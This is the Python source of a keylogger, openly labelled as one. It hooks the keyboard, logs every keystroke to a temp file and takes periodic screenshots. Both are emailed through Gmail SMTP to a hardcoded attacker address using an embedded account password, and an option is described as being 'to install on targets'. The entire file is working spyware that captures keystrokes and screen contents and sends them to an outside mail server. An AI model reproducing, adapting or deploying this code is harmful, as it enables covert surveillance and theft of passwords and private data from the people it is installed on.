#!/usr/bin/python
# coding=utf-8


#lib importantes
#-*- coding: utf-8 -*-

#Copyright (C) 2008 MrTrue <gui15787@gmail.com>
#     This program is free software: you can redistribute it and/or modify
#    it under the terms of the GNU General Public License as published by
#    the Free Software Foundation, either version 3 of the License, or
#    (at your option) any later version.
#
#    This program is distributed in the hope that it will be useful,
#    but WITHOUT ANY WARRANTY; without even the implied warranty of
#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#    GNU General Public License for more details.
#
#    You should have received a copy of the GNU General Public License
#    along with this program.  If not, see <https://www.gnu.org/licenses/>
import os
try:
	import pyxhook
except:
	os.system("pip install pyxhook")
	import pyxhook
import datetime,os,sys
import argparse as args
import smtplib
from time import *
try:
	import pyscreenshot as ImageGrab
except:
	os.system("pip install pyscreenshot")
	os.system("pip install Pillow")
	import pyscreenshot as ImageGrab
from email.MIMEMultipart import MIMEMultipart
from email.MIMEBase import MIMEBase
from email.MIMEText import MIMEText
from email.mime.image import MIMEImage
from email import Encoders
from email.Utils import COMMASPACE, formatdate

#arguments
parser = args.ArgumentParser()
# parser.add_argument("-e", "--email",required=True,help="Your email to send the logs")
# parser.add_argument("-p", "--password",required=True,help="Your password to the program send the logs")
parser.add_argument("-l", "--local",required=False,type=str,default="/tmp/logs.txt",help="the place where do you will put the logs")
parser.add_argument("-t", "--time",required=False,type=int,default=60,help="is the time the Screenshots is will be sended to your email ")
parser.add_argument("-i", "--install",required=False,type=str,default=False,help="to install on targets")

parsed_args = parser.parse_args()

if parsed_args.install:
	print(parsed_args.install)
else:
	print(False)
data_hora = datetime.datetime.now()
data_hora = str(data_hora).split('.')[0].replace(' ','_')###
sendTo = "r0xr0xhacked@gmail.com" #para onde você ira enviar o arquivo
assunto = 'Keylogger %s' %data_hora
mensagem = ' the keylogger dumped it %s '%data_hora #mensagem é também pega a data é a hora do pc 
youremail = "r0xr0xhacked@gmail.com"
password = "rockyoubabe"
server= 'smtp.gmail.com' #o servidor pode ser do gmail dentre outros
port = 587
sendtime = parsed_args.time
log_file = "/tmp/tmp234.log"


def send_Image(image):
  img_data = open(image, 'rb').read()
  msg = MIMEMultipart()
  From = youremail
  To = youremail

  msg['Subject'] = 'Screenshots'
  msg['From'] = From
  msg['To'] = To

  text = MIMEText('keylogger images')
  msg.attach(text)
  fp = open(image, 'rb')
  msgImage = MIMEImage(fp.read())
  fp.close()
  msg.attach(msgImage)

  s = smtplib.SMTP(server, port)
  s.ehlo()
  s.starttls()
  s.ehlo()
  s.login(youremail, password)
  s.sendmail(From, To, msg.as_string())
  s.quit()

def screenshot():
  while True:
    im = ImageGrab.grab()

    for i in range(100):
      sleep(sendtime)
      atual_image = i
      im.save(str(i), 'jpeg')

      if i == atual_image:
        dic = os.getcwd() + "/" + str(i) 

        send_Image(dic)
        os.remove(dic)
     

#essa funão gerencia cria os heards dentre outras coisas 
def send_email(server, port, FROM, PASS, TO, subject, texto, anexo=[]):
  global exit 
  server = server
  port = port
  FROM = FROM
  PASS = PASS
  TO = TO
  subject = subject
  texto = texto
  msg = MIMEMultipart()
  msg['From'] = FROM
  msg['To'] = TO
  msg['Subject'] = subject
  msg.attach(MIMEText(texto))

  for f in anexo:
    part = MIMEBase('application', 'octet-stream')
    os.chdir(r"/")
    part.set_payload(open(f, 'rb').read())
    Encoders.encode_base64(part)
    part.add_header('Content-Disposition','attachment;filename="%s"'% os.path.basename(f))
    msg.attach(part)

  try:
    gm = smtplib.SMTP(server,port)
    gm.ehlo()
    gm.starttls()
    gm.ehlo()
    gm.login(FROM, PASS)
    gm.sendmail(FROM, TO, msg.as_string())
    gm.close()

  except Exception as e:
    errorMsg = "Nao Foi Possivel Enviar o Email.\n Error: %s" % str(e)
    print('%s'%errorMsg)

try:

  def OnKeyPress(event): #essa função pega as teclas que foram precionadas
    fob=open(log_file,'a')
    fob.write(event.Key)
    fob.write('\n')

    if event.Ascii==59: #59 se esse valor e representado por ; se for precionada ele ira parar o keylogger e ira mandar o email
      fob.close()
      new_hook.cancel()
      send_email(server, port, youremail, password, sendTo, assunto, mensagem,[log_file])
      os.remove(log_file)

  new_hook = pyxhook.HookManager()
  new_hook.KeyDown= OnKeyPress
  new_hook.Key = OnKeyPress
  new_hook.HookKeyboard()
  new_hook.start()
  screenshot()
except(KeyboardInterrupt):
  print("Sorry Not Day")